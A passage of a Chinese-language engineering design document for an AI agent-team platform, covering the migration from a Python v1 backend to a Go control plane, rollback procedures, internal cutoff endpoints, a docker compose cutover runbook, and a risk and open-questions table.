- 旧 Python 守护进程连到 Go 前门时（协议 1，`hello.protocol == 1`）：该节点属于 v1 用户 → 代理给 Python；属于 v2 用户 → 拒绝并在节点页提示“请升级守护进程”。管理员改某个用户的 `platform_version` 时，控制台关闭该用户所有已代理到 Python 的节点链路（4426），守护进程重连后按新归属重新协商。

### 14.4 数据迁移与回退

详见 `data-model.md` §3。要点：

- 账号、会话、节点、设置、Git 连接、项目：**原表原地扩展**，无需搬数据。
- 团队：`at_teams.config`（YAML）→ `at_roles`，由 goose 的 Go 迁移在用户切到 v2 时按需转换（不是一次性全量，便于回退）；`at_teams` 保留只读。
- 旧对话：`at_conversations.kind` 默认 `chat`；v2 里以“旧对话”只读呈现（消息、任务、提问、留言都能看，接口见 `api.md` §3.13）；切到 v2 的用户的 v1 进行中任务在切换时被标记为 `failed`（“已迁移到 v2”），切换操作要求该用户没有 running 任务（Admin 页显示，可强制）。
- **回退**（把用户的 `platform_version` 改回 1）：前提是 v1 防护补丁已上线，否则 Python 下次重启会接管该用户的 v2 讨论串。回退时控制台：① 把该用户所有活跃讨论串置 `paused`（`pause_reason: 'rolled_back_to_v1'`），中断回合、`session.close` 全部会话、任务池停止派发；② 关闭该用户的 v2 节点链路（守护进程重连后以协议 1 跑 v1 运行）；③ 保留 v2 数据不动。由于 v1 只看 `kind='chat'` 的对话，v2 的统筹和讨论串对话、任务、提问、留言在 v1 里不可见也不会被恢复。再切回 v2 时讨论串保持暂停，由用户在 Thread 页继续。

### 14.5 Python 补丁与 Go 接管接口的副作用

Python 补丁（P1 前上线，P6 随 Python 一起删除）包含两部分：§14.1 第 4 条的数据隔离，以及只在 compose 网络里监听、用 `X-Legacy-Secret: $LEGACY_INTERNAL_SECRET` 认证的内部接口（Caddy 不转发 `/internal/*`，Go 前门对外 404）：

| 内部接口 | 作用（Python 内存里的状态） |
| --- | --- |
| `POST /internal/users/{id}/cutoff` | 关闭该用户所有 live 对话、吊销其 MCP 令牌、取消等待中的提问、断开其节点链路（与 v1 停用/删除用户时的切断逻辑相同） |
| `POST /internal/nodes/{id}/disconnect` | 断开该节点链路，从注册表移除 |
| `POST /internal/github-app/reset` | 清空安装令牌缓存和 App 凭证缓存 |
| `POST /internal/conversations/{id}/close` | 关闭某个 live 对话（项目删除时用） |
| `GET /internal/nodes/live?ids=` | 协议 1 链路的实时字段：`online`、`since`、`active[]`、`max_runs` |

Go 接管的、在 Python 内存里有副作用的接口，**先写库，再同步调用对应内部接口**（失败重试 3 次，仍失败则返回 503 并回滚写库，保证不出现“库里停用了、Python 里还在跑”）：

| Go 接口 | 调用 |
| --- | --- |
| `PATCH /api/admin/users/{id}`（`active: false`、改 `max_nodes` 导致超额） | `cutoff` |
| `DELETE /api/admin/users/{id}` | `cutoff`（在删行之前） |
| `DELETE /api/nodes/{id}`、`POST /api/nodes/{id}/token` | `nodes/{id}/disconnect` |
| `DELETE /api/admin/github-app`、`POST /api/admin/github-app/manifest`（替换 App） | `github-app/reset` |
| `DELETE /api/projects/{pid}`（v1 用户） | 对该项目每个 live 对话 `conversations/{id}/close` |
| `GET /api/nodes`、`GET /api/admin/users`（节点数） | 对协议 1 的链路合并 `nodes/live` 的字段；Go 代理节点 WS 时也自己记录 hello、连接时间和断开时间作为后备（Python 不可用时 `online` 按 Go 看到的链路给出，`active` 为空） |

### 14.6 生产切换手册（P1 上线当天）

现状：`agent-teams` 服务占着 `${BIND}:${PORT}`，Caddy 指向它。Caddy 不改。

1. 在副本库上跑一遍 `atctl migrate up` 和 v1 冒烟测试；确认 Python 补丁版本已在生产运行至少 1 天。
2. 编辑 compose：把 `agent-teams` 服务改名为 `legacy`（镜像、环境、卷不变），**去掉它的 `ports`**，健康检查保留；新增 `migrate` 和 `control-plane`，`control-plane` 用原来的 `ports: ["${BIND:-127.0.0.1}:${PORT}:${PORT}"]`，环境加 `LEGACY_URL=http://legacy:${PORT}`、`LEGACY_INTERNAL_SECRET`。
3. `docker compose run --rm migrate` → `docker compose up -d legacy control-plane`。端口从旧容器移交到新容器之间有几秒不可用：Caddy 在此期间返回 502，节点守护进程和浏览器 SSE 自动重连；进行中的 v1 运行不受影响（运行在节点上，日志可重放）。正在阻塞的 v1 `/mcp` 调用会断开，员工侧按 v1 行为重试。
4. 验证：`/healthz`、登录、项目列表、节点在线状态、一次 v1 对话发消息（经代理）、一次 `/mcp` 调用、GitHub App 安装回调。
5. **回滚**：`docker compose stop control-plane`，把 `legacy` 的 `ports` 加回并改回原名（或直接恢复备份的 compose 文件），`docker compose up -d`。Go 期间写的数据都在 v1 表里、格式相同，Python 直接可用；`00002` 新加的列 Python 不读，留着无害。

## 15. 风险与未决问题

| # | 风险 / 问题 | 影响 | 处理 |
| --- | --- | --- | --- |
| R1 | Agent SDK 未实测项：`interrupt()`、`resume`、`setPermissionMode`、长时间挂起的 `canUseTool`、`priority:'now'`、PreToolUse deny 是否压过 bypass、进程内 MCP 工具长时间阻塞 | 审批、插话、统筹强制、阻塞工具 | P3 第一周写“SDK 验收脚本”逐项实测（脚本入库，升级 SDK 时重跑）。阻塞工具有非阻塞退路（§6.3）；`resume` 不行则会话不 park（多占内存，降低 `max_active_sessions`）；`priority:'now'` 不行则 `interrupt()` + 普通发送 |
| R2 | 每个活跃 Claude 会话一个约 250 MB 子进程；订阅账号多会话共享速率限制 | 节点容量、速率限制 | 会话 park、成员懒启动、`max_active_sessions`；`rate_limit_event` 进指标并在办公室显示“限速中”；调度器在限速时降低派发 |
| R3 | `codex app-server` 标注 experimental，协议大且会变 | Codex 员工 | 精确锁 CLI 版本 + 入库生成的类型；升级前跑 mock 回归（复用调研时写的 mock Responses + MCP 场景）；退路：成员只读任务用 `codex exec --json`（无审批） |
| R4 | 现有 GitHub App 缺 `checks: read`；加权限需每个安装方批准 | CI 关卡 | 没批准时 CI 关卡降级为 off 并提示；GitHub 页显示“需要批准新权限”的链接；新建 App 直接带权限 |
| R5 | Codex `workspace-write` 在无非特权 user namespace 的容器节点不可用 | Codex 审批 | hello 上报 `sandbox_ok`（守护进程启动时试跑 bwrap）；不支持时该节点的 Codex 岗位只能选 read-only 或 danger-full-access（后者须 isolated 节点） |
| R6 | 迁移期 Python 与 Go 共用库：① Python 的启动 DDL 与 v2 迁移冲突；② **语义冲突**：v1 `Hub.recover()` 按 `at_tasks.status IN ('pending','running')` 恢复对话，不分所有者和对话类型，会接管 v2 讨论串、改写任务、取消 v2 提问；v1 对话列表会列出统筹/讨论串对话 | 数据、回退 | ① “只加不改”规则；② v1 防护补丁（只看 `kind='chat'` 且所有者 `platform_version=1`，§14.1 第 4 条）在 P1 上线、早于 `00010`；CI 冒烟测试种入 v2 行后重启 Python v1 并断言不变；回退流程先暂停 v2 讨论串（§14.4） |
| R7 | 内置 `claude` 二进制每节点约 366 MB 下载，锁 SDK 即锁 Claude Code 版本 | 安装、升级 | 控制台提供升级按钮；守护进程支持 `pathToClaudeCodeExecutable` 覆盖（节点页高级设置） |
| R8 | 控制台单副本 | 可用性 | 状态全在 PG，重启无损（会话在节点上继续跑，重连后重放）；P7 多副本 |
| R9 | 员工与守护进程同机运行，可能读到节点令牌和运行时登录；Codex 沙箱只限写不限读 | 凭证泄露 | 隔离级别（§10.3）：推荐 `agent_user`；`sandbox` 级别靠 Claude Bash 沙箱 + 路径拒绝，Codex 员工只派到 `agent_user`/`isolated` 节点；员工令牌按仓库缩小（2026-11-17 起能推送非保护分支、开 PR，保护分支靠 pre-push 钩子和 GitHub 规则集，§8.1、§10.4）。P3 实测 Claude 沙箱的 `denyRead` 对子进程生效、`CLAUDE_CONFIG_DIR` 指向员工不可读目录时 claude 仍能登录；若 Codex 后续支持限制读路径，再放宽 `sandbox` 级别对 Codex 的限制 |
| R10 | 一个项目的事件写入用 `at_projects.event_seq` 行锁串行化 | 高频状态事件时的写吞吐 | 状态去抖 800 ms、事件插入放在事务最后；P5 压测（单项目 30 员工）若锁等待明显，改为“IDENTITY + 安全窗口重读（`seq > last − 200` 且客户端按 id 去重）” |
| Q1 | 每个讨论串的成员是否允许跨项目共享节点额度上限？ | — | 先按节点 `max_active_sessions` 全局限制，不分项目 |
| Q2 | 审查岗是独立会话还是组长兼任？ | — | 默认岗位模板里可选 `review` 岗；没有审查岗时审查关卡由组长执行（组长只读，正好） |
| Q3 | 统筹和组长默认模型、成员默认模型 | 成本 | 默认都用 `claude-opus-5-5`（与 v1 约定一致）；没有模型列表，每个岗位（含统筹和组长）在岗位配置里手填模型，项目可以指定覆盖（data-model.md §2.12）。/model 只对成员生效，统筹和组长的模型在岗位配置或项目设置里改 |
| Q4 | 项目记忆的上限和摘要方式 | 提示长度 | 已定（§6.7）：记忆按文件存，只注入 MEMORY.md（200 行 / 12 KB），细节按需 `memory_read`；超出时提示员工精简 MEMORY.md |
| Q5 | 办公室布局是全站一个还是每项目可覆盖 | — | 两者都支持：文件提供默认，项目设置可选择/覆盖（`office-layout.md` §7） |
| Q6 | v1 的库功能（`chat`、`run`、SSH/本地节点、`Agent`/`Sequential` 等） | 范围 | v2 不带；保留在 v1 Python 包里，P6 后从仓库删除 |
